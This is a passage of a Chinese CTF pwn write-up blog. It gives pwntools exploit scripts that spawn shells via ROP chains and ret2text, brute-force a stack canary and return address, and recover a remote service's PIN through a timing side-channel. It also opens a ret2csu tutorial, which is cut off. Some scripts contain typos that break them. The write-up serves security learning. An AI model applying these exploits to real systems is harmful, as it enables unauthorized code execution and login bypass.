class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret _59</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>,p)</span><br><span class="line">r.interactive(）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527201915278.png" alt="image-20230527201915278"></p><p>优化后的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">r=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.71.184&#x27;,23931)</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;？\n&quot;</span>,<span class="string">b&quot;-10000&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">pop_rsi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) </span><br><span class="line">pop_rax_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>)</span><br><span class="line">mov_rax_ptr_rsi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>)</span><br><span class="line">xor_rax_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>)</span><br><span class="line">pop_rdi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>)</span><br><span class="line">pop_rdx_rbx_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>)</span><br><span class="line"></span><br><span class="line">p = padding</span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>)   <span class="comment"># @ .data</span></span><br><span class="line">p += pop_rax_ret + <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += mov_rax_ptr_rsi_ret</span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>)   <span class="comment"># @ .data + 8</span></span><br><span class="line">p += xor_rax_ret</span><br><span class="line">p += mov_rax_ptr_rsi_ret</span><br><span class="line">p += pop_rdi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>)   <span class="comment"># @ .data</span></span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>)   <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pop_rdx_rbx_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>) + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">p += xor_rax_ret</span><br><span class="line">add_rip_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">rop_len = <span class="number">59</span></span><br><span class="line">rop_chain = [add_rip_ret] * rop_len<span class="comment">#构建一个rop_len 完成execve</span></span><br><span class="line">p += <span class="string">b&#x27;&#x27;</span>.join(rop_chain)<span class="comment">#将列表转换为字符串进行填充</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>,p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="【funcannary】"><a href="#【funcannary】" class="headerlink" title="【funcannary】"></a><strong>【funcannary】</strong></h4><p>涨知识涨知识 没学够的菜狗😀<br>（1）先运行一下 pei’d配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p><p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p><p>（2）进IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>函数入口为0x122D shell返回地址为1329 偏移为0xfc 覆盖的buf大小为0x62</p><p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 ...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()将给定的整数转换为单字节的字节串</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1对齐栈</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地get<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530213510778.png" alt="image-20230530213510778">  </p><p><strong>login</strong><br>无附件 只打远程 涨知识捏 侧信道攻击 </p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">    p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">    p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpin</span>(<span class="params">pin</span>):</span><br><span class="line">subtime = -<span class="number">1</span></span><br><span class="line">res =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line">pin_o = pin+c+<span class="string">&#x27;0&#x27;</span>*(<span class="number">7</span>-<span class="built_in">len</span>(pin))</span><br><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;PIN code: &quot;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line">sl(pin_o)</span><br><span class="line">rev=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Wrong PIN code&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(pin_0)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">end=time.time()</span><br><span class="line"><span class="built_in">sum</span>+=(end-start)</span><br><span class="line"><span class="built_in">print</span>(cur,<span class="built_in">sum</span>)</span><br><span class="line">avgtime=<span class="built_in">sum</span></span><br><span class="line"><span class="keyword">if</span>(avgtime&gt;subtime):</span><br><span class="line">subtime=avgtime</span><br><span class="line">res=c</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">a=<span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">p= remote(<span class="string">&quot;123.56.238.150&quot;</span>,<span class="number">45118</span>)</span><br><span class="line">pin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">pin+=getpin(pin)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;PIN:&quot;</span>,pin)</span><br><span class="line">ru(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;PASSWD&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;d39a1013-e066-4d64-8558-4a5855fb7303&#125;   pin code : 54730891</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="【SSCTF】"><a href="#【SSCTF】" class="headerlink" title="【SSCTF】"></a>【SSCTF】</h3><p>pwn_stack<br>（1）checksec </p><p>​      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604234931863.png" alt="image-20230604234931863"></p><p>​       只开了NX好办捏😀<br>（2） 进IDA<br>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235352214.png" alt="image-20230604235352214"></p><p>很明显的函数提示 先看看主函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235530821.png" alt="image-20230604235530821"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235541815.png" alt="image-20230604235541815"></p><p>buf溢出但被打印出 可忽视（此处知识点较为模糊 还需进一步进行研究解读）v1处溢出<br>查看偏移位0x98 再回到shell函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230605000024030.png" alt="image-20230605000024030"></p><p>没什么好说直接开整 典型ret2text<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)<span class="comment">#太懒了给文件名改名了😜</span></span><br><span class="line">bin_sh = <span class="number">0x0400831</span> </span><br><span class="line">sys_addr = <span class="number">0x40083D</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;What&#x27;s your name?&quot;)</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;A&#x27;</span>* (<span class="number">0x90</span> + <span class="number">8</span>) + p64(bin_sh)  + p64(sys_addr)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;yub&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;How old are you?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>从函数头返回注意栈对齐问题 +1跳过push rbp的8字节对齐</p><h3 id="【Black-Rop】"><a href="#【Black-Rop】" class="headerlink" title="【Black Rop】"></a>【Black Rop】</h3><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171541372.png" alt="image-20230629171541372"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171837565.png" alt="image-20230629171837565"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171906502.png" alt="image-20230629171906502"></p><p>常规溢出捏~<br>系统没给出system和”&#x2F;bin&#x2F;sh” 所以构造rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">pop4 = <span class="number">0x080493e8</span> <span class="comment"># pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop1 = <span class="number">0x0804901e</span> <span class="comment"># pop ebx ; ret</span></span><br><span class="line">pop2 = <span class="number">0x080493ea</span> <span class="comment"># pop edi ; pop ebp ; ret</span></span><br><span class="line">pop3 = <span class="number">0x080493e9</span> <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x12</span>+ flat(<span class="number">0</span>,<span class="number">0x80492ce</span>,<span class="number">0x8049293</span>, pop1, <span class="number">0x804a033</span>, <span class="number">0x80492e8</span>, pop1, <span class="number">0xbae</span>, <span class="number">0x804930b</span>, pop2, <span class="number">0x62023</span> , <span class="number">0xBF1212</span>, <span class="number">0x80491c2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;check your identity and read the flag.\n&quot;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2023/09/01/ret2csu/"/>
      <url>/2023/09/01/ret2csu/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用x64下__libc_csu_init函数中的gadgets.（64位传参机制导致，但我们不会每次都精准找到每个寄存器对应的gadgets）</p><p>此函数对libc进行初始化，而一般的程序都会调用libc函数，则此函数一定存在.</p><p><strong>什么是gadgets？</strong><br>gadgets是一段对寄存器进行操作的汇编指令，比如pop ebp；pop eax；每一条指令对应着一段地址将这些gadgets部署到栈中，__ sp指针指向某gadget时发现对应地址中是一条指令而不是一条数据后就会将该地址弹给 __ ip指针， __ip指针会执行该地址中存放的汇编指令，完成对寄存器的操作.（某一gadget-0x1a得到上一gadget） </p><h3 id="实例（蒸米ROP）"><a href="#实例（蒸米ROP）" class="headerlink" title="实例（蒸米ROP）"></a>实例（蒸米ROP）</h3><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> 